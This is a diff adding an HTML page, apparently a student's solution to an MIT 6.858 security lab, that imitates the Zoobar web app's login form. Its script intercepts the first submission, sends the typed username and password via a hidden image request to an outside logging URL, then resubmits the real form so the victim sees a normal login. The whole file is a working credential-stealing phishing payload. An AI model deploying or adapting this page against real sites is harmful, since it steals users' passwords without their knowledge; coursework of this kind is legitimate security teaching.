@@ -1,0 +1,42 @@
+<base href="http://localhost:8080">
+<form name="loginform" method="POST" action="/zoobar/index.cgi/login">
+	<table>
+		<tr>
+   			<td>Username:</td>
+  			<td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
+		</tr>
+		<tr>
+   			<td>Password:</td>
+  			<td colspan=2>
+				<input type="password" name="login_password" size=20 autocomplete="no">
+  				<input type="submit" name="submit_login" value="Log in">
+  				<input type="submit" name="submit_registration" value="Register">
+			</td>
+		</tr>
+	</table>
+	<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+</form>
+<script>
+	var reg = false;
+	var click = 1;
+
+	function submit(event) {
+		if (click == 1) {
+    			event.preventDefault();
+    			(new Image()).src="https://css.csail.mit.edu/6.858/2020/labs/log.php?" + 'id=mkoszy' + '&payload=' + 
+				encodeURIComponent(document.getElementsByName("login_username")[0].value) + "/" + 
+				encodeURIComponent(document.getElementsByName("login_password")[0].value) + '&random=' + Math.random();
+    			setTimeout(function(){
+        			if (reg==true) {
+            				document.getElementsByName("submit_registration")[0].click();
+        			} else {
+            				document.getElementsByName("submit_login")[0].click();
+        			}
+    			}, 2000);
+    		}
+    		click = click + 1;
+	}                                                
+
+	document.getElementsByName("loginform")[0].addEventListener("submit", function(event){submit(event);});
+	document.getElementsByName("submit_registration")[0].addEventListener("click", function(event){reg = true;});
+</script>
